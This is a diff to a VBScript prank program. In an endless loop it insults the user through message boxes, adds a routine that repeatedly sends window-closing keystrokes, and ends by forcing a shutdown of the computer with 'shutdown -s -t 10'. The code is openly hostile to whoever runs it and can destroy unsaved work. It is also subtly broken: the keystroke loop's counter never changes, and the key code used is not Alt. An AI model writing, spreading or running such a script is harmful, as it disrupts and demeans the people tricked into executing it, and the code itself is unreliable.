@@ -32,9 +32,17 @@ Function three() 'step 3
 End Function
 
 Function four() 'step 4
-    Dim WSHshell
-    Set WSHshell=wscript.createobject("wscript.shell")
-    WSHshell.run "shutdown -s -t 10",0,true 'shutdown the computer after 10 seconds
+    Dim wsh,yee
+    Set wsh=wscript.createobject("wscript.shell")
+    Do until yee=50 'close everything you open
+        wsh.SendKeys "&{F4}"
+    Loop
+End Function
+
+Function five() 'step 5
+    Dim wsh
+    Set wsh=wscript.createobject("wscript.shell")
+    wsh.run "shutdown -s -t 10",0,true 'shutdown the computer after 10 seconds
 End Function
 
 Do 'the way to ridicule
@@ -51,7 +59,10 @@ Do 'the way to ridicule
     MsgBox "but you know,i won't stop until you give up",4096,"yep you are stupid"
     Call three()
 
+    MsgBox "it's not the final ridicule"
+    Call four()
+
     MsgBox "now the final one hehhehhehhehh",4096,"yep you are stupid"
     MsgBox "wait for 10 seconds......",4096,"yep you are stupid"
-    Call four()
+    Call five()
 Loop
